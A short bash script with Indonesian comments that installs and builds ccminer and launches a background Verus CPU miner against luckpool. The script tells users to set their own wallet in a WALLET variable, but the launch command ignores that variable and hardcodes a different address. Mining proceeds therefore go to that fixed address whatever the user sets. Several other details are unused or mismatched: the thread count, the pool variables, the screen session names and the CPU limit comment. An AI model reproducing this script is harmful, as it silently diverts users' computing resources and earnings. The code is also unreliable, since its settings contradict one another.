#!/bin/bash

# Nama sesi screen utama
SCREEN_NAME="verus"

# Alamat Wallet Verus (GANTI DENGAN PUNYAMU)
WALLET="RHbaCG4TcYka72m9fmyjpRVXSAs1aJEZjU"

# Pool dan port
POOL="na.luckpool.net"
PORT=3956

# Password & Threads
PASSWORD=""
THREADS=14  # Gunakan 1 thread per miner

# Cek apakah mining sudah berjalan
if screen -list | grep -q "$SCREEN_NAME"; then
    echo "Mining sudah berjalan! Gunakan 'screen -r $SCREEN_NAME' untuk melihat log."
    exit 1
fi

echo "🔹 Mengupdate dan menginstal dependencies..."
sudo apt update && sudo apt upgrade -y
sudo apt install cpulimit -y
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y

echo "🔹 Mengunduh CCMiner..."
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer || { echo "Gagal masuk ke direktori ccminer!"; exit 1; }

echo "🔹 Memberikan izin eksekusi pada script build..."
chmod +x build.sh configure.sh autogen.sh

echo "🔹 Memulai proses build CCMiner..."
./build.sh

cd ..

echo "🔹 Memulai  miner..."
screen -dmS Miner ./ccminer/ccminer -a verus -o stratum+tcp://na.luckpool.net:3956#xnsub -u RHbaCG4TcYka72m9fmyjpRVXSAs1aJEZjUT -p x -t 15  --cpu-priority=5

echo "🔹 Menjalankan CPU limit (700 per core).."
ulimit -u unlimited
ulimit -n 100000

pkill -f cpulimit
cpulimit -e ccminer -l 1450 -b 

echo "✅ Mining dimulai! Gunakan 'screen -r Miner1' atau 'screen -ls' untuk melihat log."
